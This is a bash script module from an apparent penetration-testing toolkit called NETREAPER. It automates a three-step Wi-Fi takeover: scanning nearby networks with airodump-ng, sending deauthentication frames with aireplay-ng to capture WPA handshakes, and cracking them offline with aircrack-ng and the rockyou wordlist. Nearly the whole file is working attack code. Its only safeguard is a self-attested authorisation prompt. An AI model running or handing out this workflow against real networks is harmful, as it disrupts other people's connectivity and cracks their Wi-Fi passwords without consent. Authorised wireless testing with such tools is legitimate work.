#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════════════════
# NETREAPER - Wireless Takeover Wizard
# ═══════════════════════════════════════════════════════════════════════════════
# Copyright (c) 2025 Nerds489
# SPDX-License-Identifier: Apache-2.0
#
# Wireless takeover wizard: Wi-Fi survey → deauth to capture handshakes → offline cracking
# ═══════════════════════════════════════════════════════════════════════════════

# Prevent multiple sourcing
[[ -n "${_NETREAPER_WIFI_WIZARD_LOADED:-}" ]] && return 0
readonly _NETREAPER_WIFI_WIZARD_LOADED=1

# Source library files
source "${BASH_SOURCE%/*}/../lib/core.sh"
source "${BASH_SOURCE%/*}/../lib/ui.sh"
source "${BASH_SOURCE%/*}/../lib/safety.sh"
source "${BASH_SOURCE%/*}/../lib/detection.sh"
source "${BASH_SOURCE%/*}/../lib/utils.sh"
source "${BASH_SOURCE%/*}/../lib/wireless.sh"

#═══════════════════════════════════════════════════════════════════════════════
# WIFI WIZARD FUNCTIONS
#═══════════════════════════════════════════════════════════════════════════════

# Wireless takeover wizard
run_wifi_takeover_wizard() {
    local arg="$1"
    # Show help if requested
    if [[ "$arg" == "-h" || "$arg" == "--help" ]]; then
        cat <<'USAGE'
Wi-Fi Takeover Wizard
Usage: netreaper wizard wifi [interface]

This guided workflow performs a Wi-Fi survey, captures a handshake via deauthentication
and attempts offline cracking.  You will be prompted before each step and can resume
from checkpoints if interrupted.  Use NR_LITE_MODE=1 or --lite to reduce capture
duration and use a smaller wordlist during cracking.
USAGE
        return 0
    fi
    local iface="$arg"
    operation_header "Wireless Takeover Wizard" "Automated workflow"

    # If no interface provided ask the user
    if [[ -z "$iface" ]]; then
        iface=$(select_wireless_interface)
        if [[ -z "$iface" ]]; then
            log_error "No wireless interface selected"
            return 1
        fi
    fi

    # Pre‑flight: confirm authorization
    if ! confirm "Are you authorised to perform Wi‑Fi deauthentication and cracking tests on this network?" "n"; then
        log_info "Aborting wizard: authorisation not confirmed"
        return 1
    fi

    # Start resource monitor to auto-enable lite mode if necessary
    if command -v monitor_loop >/dev/null 2>&1; then
        monitor_loop 20 &
    fi

    # Resume from checkpoint if available
    local current_step=1
    local cp_data
    cp_data=$(load_checkpoint "wifi_wizard" "$iface")
    if [[ -n "$cp_data" ]]; then
        current_step=$(echo "$cp_data" | python3 -c "import sys,json; data=json.load(sys.stdin); print(data.get('step', 1))" 2>/dev/null || echo 1)
        if [[ "$current_step" -gt 1 ]]; then
            log_info "Resuming from step $current_step"
        fi
    fi

    log_info "Starting wireless takeover on interface: $iface"
    if is_lite; then
        log_info "Lite mode enabled – shorter scans and smaller wordlists will be used"
    fi
    echo

    local total_steps=3
    local survey_file=""
    local handshake_file=""
    # Step 1: Wi‑Fi survey
    if [[ $current_step -le 1 ]]; then
        echo -e "${C_CYAN}Progress: [1/$total_steps] Wi‑Fi Survey${C_RESET}"
        log_info "Scanning for nearby wireless networks."
        # Check for existing survey file to reuse
        local latest_survey
        latest_survey=$(ls -1t "$OUTPUT_DIR"/wifi_survey_*.csv 2>/dev/null | head -n1 || true)
        if [[ -n "$latest_survey" ]]; then
            if confirm "Reuse previous survey results from $(basename "$latest_survey")?" "y"; then
                survey_file="$latest_survey"
            fi
        fi
        if confirm "Proceed with Wi‑Fi survey?" "y"; then
            # Determine capture duration based on lite mode
            local duration=30
            if is_lite; then
                duration=10
            fi
            survey_file=$(run_wifi_survey "$iface" "$duration" 2>/dev/null) || true
            if [[ -z "$survey_file" ]]; then
                log_error "Wi‑Fi survey failed"
            fi
        else
            log_info "Survey skipped"
        fi
        save_checkpoint "wifi_wizard" "2" "$iface"
    fi
    echo

    # Step 2: Deauth & handshake capture (including network selection)
    if [[ $current_step -le 2 ]]; then
        echo -e "${C_CYAN}Progress: [2/$total_steps] Handshake Capture${C_RESET}"
        # If we don't yet have survey_file from resume, attempt to find latest survey output
        if [[ -z "$survey_file" ]]; then
            survey_file=$(ls -1t "$OUTPUT_DIR"/wifi_survey_*.csv 2>/dev/null | head -n1)
        fi
        local bssid essid channel
        if [[ -z "$survey_file" ]] || ! select_target_network "$survey_file"; then
            log_error "No target network selected"
        else
            log_info "Preparing deauthentication and handshake capture"
            if confirm "Proceed with deauthentication? (May disrupt connectivity)" "n"; then
                handshake_file=$(run_deauth_capture "$iface" "$bssid" "$channel" 2>/dev/null) || true
                if [[ -z "$handshake_file" ]]; then
                    log_error "Handshake capture failed"
                fi
            else
                log_info "Deauthentication skipped"
            fi
        fi
        save_checkpoint "wifi_wizard" "3" "$iface"
    fi
    echo

    # Step 3: Offline cracking
    if [[ $current_step -le 3 ]]; then
        echo -e "${C_CYAN}Progress: [3/$total_steps] Offline Cracking${C_RESET}"
        log_info "Cracking the captured handshake using wordlists."
        if confirm "Proceed with cracking? (May take time)" "y"; then
            # Choose a smaller wordlist in lite mode via get_wordlist
            local passlist
            passlist=$(get_wordlist "/usr/share/wordlists/rockyou.txt")
            run_offline_crack "$handshake_file" "$essid" "$passlist"
        else
            log_info "Cracking skipped"
        fi
        save_checkpoint "wifi_wizard" "4" "$iface"
    fi
    echo

    operation_summary "success" "Wireless takeover wizard complete" "Review outputs in $OUTPUT_DIR"
    log_audit "WIFI_WIZARD" "$iface" "success"
}

# Wi-Fi survey
run_wifi_survey() {
    # Perform a wireless survey on the given interface.  The optional second
    # argument specifies the duration (in seconds) to capture for; defaults to 30s.
    local iface="$1" duration="${2:-30}"
    # Validate required tool
    if ! check_tool "airodump-ng"; then
        log_error "airodump-ng is not installed"
        return 1
    fi
    # Ensure monitor mode is enabled on the interface
    if ! check_monitor_mode "$iface"; then
        log_info "Enabling monitor mode on $iface"
        enable_monitor_mode "$iface" || return 1
    fi
    local outfile
    outfile="${OUTPUT_DIR}/wifi_survey_$(timestamp_filename).csv"
    operation_header "Wi-Fi Survey" "$iface"
    log_command_preview "timeout ${duration} airodump-ng --output-format csv -w survey \"$iface\""
    log_info "Scanning for networks for ${duration}s..."
    timeout "$duration" airodump-ng --output-format csv -w "${OUTPUT_DIR}/survey" "$iface" >/dev/null 2>&1
    local exit_code=$?
    if [[ $exit_code -eq 0 ]] || [[ $exit_code -eq 124 ]]; then
        mv "${OUTPUT_DIR}/survey-01.csv" "$outfile" 2>/dev/null
        operation_summary "success" "Survey complete" "Output: $outfile"
        echo "$outfile"
    else
        operation_summary "failed" "Survey failed"
        return 1
    fi
}

# Select target network from survey
select_target_network() {
    local survey_file="$1"

    if [[ ! -f "$survey_file" ]]; then
        log_error "Survey file not found"
        return 1
    fi

    log_info "Available networks:"
    awk -F',' 'NR>2 && NF>13 {print NR-2 ": " $14 " (" $1 ") Ch:" $4 " Enc:" $6}' "$survey_file" | head -10

    local choice
    choice=$(get_input "Select network number (1-10)")

    if [[ -z "$choice" ]] || ! [[ "$choice" =~ ^[0-9]+$ ]]; then
        return 1
    fi

    local line
    line=$((choice + 2))
    bssid=$(awk -F',' "NR==$line {print \$1}" "$survey_file")
    essid=$(awk -F',' "NR==$line {print \$14}" "$survey_file")
    channel=$(awk -F',' "NR==$line {print \$4}" "$survey_file")

    if [[ -z "$bssid" ]]; then
        log_error "Invalid selection"
        return 1
    fi

    log_info "Selected: $essid ($bssid) on channel $channel"
    return 0
}

# Deauthentication and capture
run_deauth_capture() {
    local iface="$1" bssid="$2" channel="$3"

    local mon_iface="${iface}mon"
    local outfile="${OUTPUT_DIR}/handshake_${bssid//:/}_$(timestamp_filename).cap"

    operation_header "Handshake Capture" "$bssid"
    log_command_preview "airodump-ng -c \"$channel\" --bssid \"$bssid\" -w handshake \"$mon_iface\" & aireplay-ng -0 5 -a \"$bssid\" \"$mon_iface\""
    log_info "Capturing handshakes..."

    # Start capture in background
    airodump-ng -c "$channel" --bssid "$bssid" -w "${OUTPUT_DIR}/handshake" "$mon_iface" >/dev/null 2>&1 &
    local dump_pid=$!

    # Deauth
    aireplay-ng -0 5 -a "$bssid" "$mon_iface" >/dev/null 2>&1
    local exit_code=$?

    # Wait a bit for capture
    sleep 10
    kill $dump_pid 2>/dev/null

    if [[ $exit_code -eq 0 ]]; then
        mv "${OUTPUT_DIR}/handshake-01.cap" "$outfile" 2>/dev/null
        operation_summary "success" "Capture complete" "Output: $outfile"
        echo "$outfile"
    else
        operation_summary "failed" "Capture failed"
        return 1
    fi
}

# Offline cracking
run_offline_crack() {
    # Crack a captured handshake using the specified password list.
    # Args:
    #   $1 – capture file (.cap)
    #   $2 – ESSID (network name)
    #   $3 – optional path to wordlist (if omitted uses DEFAULT_WORDLIST or rockyou)
    local cap_file="$1" essid="$2" passlist="$3"

    if ! check_tool "aircrack-ng"; then
        log_error "aircrack-ng is not installed"
        return 1
    fi

    # Determine which wordlist to use
    local wordlist
    if [[ -n "$passlist" ]]; then
        wordlist="$passlist"
    elif [[ -n "${DEFAULT_WORDLIST:-}" ]]; then
        wordlist="$DEFAULT_WORDLIST"
    else
        wordlist="/usr/share/wordlists/rockyou.txt"
    fi

    local outfile="${OUTPUT_DIR}/crack_${essid}_$(timestamp_filename).txt"

    operation_header "Offline Cracking" "$essid"
    log_command_preview "aircrack-ng -w \"$wordlist\" -b <bssid> \"$cap_file\""
    log_info "Cracking handshake..."

    aircrack-ng -w "$wordlist" "$cap_file" | tee "$outfile"
    local exit_code=$?

    if [[ $exit_code -eq 0 ]]; then
        operation_summary "success" "Cracking complete" "Output: $outfile"
    else
        operation_summary "failed" "Cracking failed"
    fi

    return $exit_code
}

#═══════════════════════════════════════════════════════════════════════════════
# EXPORT FUNCTIONS
#═══════════════════════════════════════════════════════════════════════════════

export -f run_wifi_takeover_wizard run_wifi_survey select_target_network run_deauth_capture run_offline_crack